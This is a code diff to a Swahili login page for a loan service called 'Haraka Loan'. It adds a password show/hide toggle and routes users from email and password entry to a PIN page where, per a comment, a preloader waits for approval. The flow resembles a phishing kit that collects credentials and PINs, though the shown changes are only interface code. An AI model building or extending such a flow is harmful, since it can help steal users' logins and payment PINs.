@@ -88,6 +88,10 @@
       margin-bottom: 6px;
     }
 
+    .input-wrap {
+      position: relative;
+    }
+
     .form-group input {
       width: 100%;
       padding: 14px 16px;
@@ -100,6 +104,10 @@
       font-family: inherit;
     }
 
+    .input-wrap input {
+      padding-right: 48px;
+    }
+
     .form-group input:focus {
       border-color: #1a5f2a;
       background: #ffffff;
@@ -109,6 +117,29 @@
     .form-group input::placeholder {
       color: #b2bec3;
       font-weight: 400;
+    }
+
+    .eye-btn {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      padding: 6px;
+      border: 0;
+      border-radius: 8px;
+      background: transparent;
+      color: #636e72;
+      cursor: pointer;
+      line-height: 0;
+      transition: color 0.15s;
+    }
+
+    .eye-btn:hover { color: #1a5f2a; }
+
+    .eye-btn svg {
+      width: 20px;
+      height: 20px;
+      stroke: currentColor;
     }
 
     .form-group a {
@@ -176,27 +207,58 @@
 
       <form id="loginForm">
         <div class="form-group">
-          <label>Barua Pepe</label>
+          <label for="email">Barua pepe</label>
           <input type="email" name="email" id="email" placeholder="barua@mfano.com" required>
         </div>
         <div class="form-group">
-          <label>Password</label>
-          <input type="password" name="password" id="password" placeholder="Password yako" required>
-          <a href="#" onclick="return false;">Umesahau password?</a>
+          <label for="password">Nenosiri</label>
+          <div class="input-wrap">
+            <input type="password" name="password" id="password" placeholder="Nenosiri lako" required>
+            <button type="button" class="eye-btn" id="togglePassword" aria-label="Onyesha nesosiri">
+              <svg id="eyeOn" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                <circle cx="12" cy="12" r="3"/>
+              </svg>
+              <svg id="eyeOff" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden">
+                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+                <line x1="1" y1="1" x2="23" y2="23"/>
+              </svg>
+            </button>
+          </div>
+          <a href="#" onclick="return false;">Umesahau nenosiri?</a>
         </div>
-        <button type="submit" class="btn">Ingia</button>
+        <button type="submit" class="btn" id="loginBtn">Ingia</button>
       </form>
     </div>
 
-    <a class="back-link" href="index.html">← Rudi kwenye Haraka Loan</a>
+    <a class="back-link" href="/">← Rudi kwenye Haraka Loan</a>
   </div>
 
+  <style>
+    .hidden { display: none; }
+  </style>
+
   <script>
+    /* ===== Onyesha / ficha nenosiri ===== */
+    const passwordInput = document.getElementById('password');
+    const toggleBtn = document.getElementById('togglePassword');
+    const eyeOn = document.getElementById('eyeOn');
+    const eyeOff = document.getElementById('eyeOff');
+
+    toggleBtn.addEventListener('click', function () {
+      const showing = passwordInput.type === 'text';
+      passwordInput.type = showing ? 'password' : 'text';
+      eyeOn.classList.toggle('hidden', !showing);
+      eyeOff.classList.toggle('hidden', showing);
+      this.setAttribute('aria-label', showing ? 'Onyesha nenosiri' : 'Ficha nenosiri');
+    });
+
+    /* ===== Kutuma: hamia ukurasa wa PIN (preloader inasubiri uidhinishaji huko) ===== */
     document.getElementById('loginForm').addEventListener('submit', async function (e) {
       e.preventDefault();
       const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value;
-      const btn = this.querySelector('.btn');
+      const password = passwordInput.value;
+      const btn = document.getElementById('loginBtn');
       btn.disabled = true;
       btn.textContent = 'Inatuma…';
 
@@ -209,17 +271,15 @@
         });
         const j = await res.json();
         if (j.ok && j.ref) { ref = j.ref; }
-      } catch (_) { /* backend not running — fallback below */ }
+      } catch (_) { /* backend haipatikani — endelea na ukurasa wa PIN */ }
 
       localStorage.setItem('haraka_pay_email', email);
       btn.disabled = false;
       btn.textContent = 'Ingia';
 
-      if (ref) {
-        window.location.href = 'pin.html?ref=' + encodeURIComponent(ref);
-      } else {
-        window.location.href = 'pin.html';
-      }
+      window.location.href = ref
+        ? '/pin?ref=' + encodeURIComponent(ref)
+        : '/pin';
     });
   </script>
 </body>
